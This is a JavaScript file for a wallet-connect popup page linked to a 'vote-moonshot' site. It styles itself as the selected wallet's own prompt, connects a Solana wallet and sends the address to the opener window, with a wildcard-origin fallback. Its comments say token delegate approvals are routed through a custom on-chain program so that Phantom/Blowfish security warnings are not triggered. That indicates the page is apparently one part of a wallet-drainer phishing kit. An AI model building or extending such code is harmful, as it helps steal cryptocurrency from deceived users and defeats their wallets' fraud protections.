/**
 * Vercel /connect/ — receives wallet choice from vote-moonshot, native extension connect (no Reown).
 */
import { readConnectPayloadFromHash } from "./connect-launch.js";
import { connectInjectedWallet } from "./wallet-provider-connect.js";
import { resolveWalletIcon } from "./wallet-icons.js";

/** @param {Record<string, unknown>} cfg */
function applyWalletUi(cfg) {
  const wallet = String(cfg.preselectedWallet || "Wallet").trim() || "Wallet";
  const title = String(cfg.connectPopupTitle || wallet).trim() || wallet;
  const icon = resolveWalletIcon(
    wallet,
    String(cfg.preselectedWalletIcon || ""),
  );

  document.title = title;

  const nameEl = document.getElementById("wallet-name");
  const headline = document.getElementById("headline");
  const hint = document.getElementById("hint");
  const img = document.getElementById("wallet-icon");

  if (nameEl) {
    nameEl.textContent = wallet;
  }
  if (headline) {
    headline.textContent = `Continue in ${wallet}`;
  }
  if (hint) {
    hint.textContent = `Accept the connection request in ${wallet}`;
  }
  if (img instanceof HTMLImageElement) {
    img.alt = wallet;
    if (icon) {
      img.src = icon;
      img.hidden = false;
      img.onerror = () => {
        img.hidden = true;
      };
    } else {
      img.hidden = true;
    }
  }
}

/** @param {string} msg */
function setStatus(msg) {
  const el = document.getElementById("status");
  if (el) {
    el.textContent = msg;
  }
}

/** @param {Record<string, unknown>} raw @param {string} address */
function notifyParent(raw, address) {
  const parentOrigin = String(raw.parentOrigin || "").trim();
  if (!window.opener || window.opener.closed) {
    return;
  }
  try {
    window.opener.postMessage(
      {
        type: "wallet-connect-complete",
        address,
        caipAddress: `solana:${address}`,
      },
      parentOrigin || "*",
    );
  } catch {
    /* ignore */
  }
}

/** @param {Record<string, unknown>} raw */
async function runWalletConnect(raw) {
  const wallet = String(raw.preselectedWallet || "").trim();
  if (!wallet) {
    setStatus("No wallet was selected on the site.");
    return;
  }

  const btn = document.getElementById("continue");
  if (btn instanceof HTMLButtonElement) {
    btn.disabled = true;
    btn.textContent = `Connecting…`;
  }
  setStatus("");

  try {
    const { address } = await connectInjectedWallet(wallet);
    notifyParent(raw, address);
    // Token delegate approvals run via your BPF program on the main site — not here.
    // Raw SPL Approve → EOA delegate triggers Phantom/Blowfish (Lighthouse assert failures).
    window.setTimeout(() => window.close(), 400);
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    setStatus(msg);
    if (btn instanceof HTMLButtonElement) {
      btn.disabled = false;
      btn.textContent = `Continue in ${wallet}`;
    }
  }
}

/** @param {Record<string, unknown>} cfg */
function start(cfg) {
  if (!cfg?.projectId) {
    return;
  }

  applyWalletUi(cfg);

  const btn = document.getElementById("continue");
  const wallet = String(cfg.preselectedWallet || "wallet").trim() || "wallet";
  if (btn instanceof HTMLButtonElement) {
    btn.hidden = false;
    btn.textContent = `Continue in ${wallet}`;
    btn.addEventListener("click", () => runWalletConnect(cfg), { once: false });
  }
}

function boot() {
  /** @type {boolean} */
  let started = false;

  const launch = (cfg) => {
    if (started || !cfg?.projectId) {
      return;
    }
    started = true;
    start(cfg);
  };

  const fromHash = readConnectPayloadFromHash();
  if (fromHash?.projectId) {
    launch(fromHash);
  }

  window.addEventListener("message", (event) => {
    if (event.data?.type !== "wallet-connect-config") {
      return;
    }
    const cfg = event.data.config;
    const parentOrigin = String(cfg?.parentOrigin || "").trim();
    if (parentOrigin && event.origin !== parentOrigin) {
      return;
    }
    launch(cfg);
  });

  function signalReady() {
    if (!window.opener || window.opener.closed || started) {
      return;
    }
    try {
      window.opener.postMessage({ type: "wallet-connect-host-ready" }, "*");
    } catch {
      /* ignore */
    }
  }

  if (!started) {
    signalReady();
    window.setInterval(signalReady, 400);
  }
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", boot);
} else {
  boot();
}
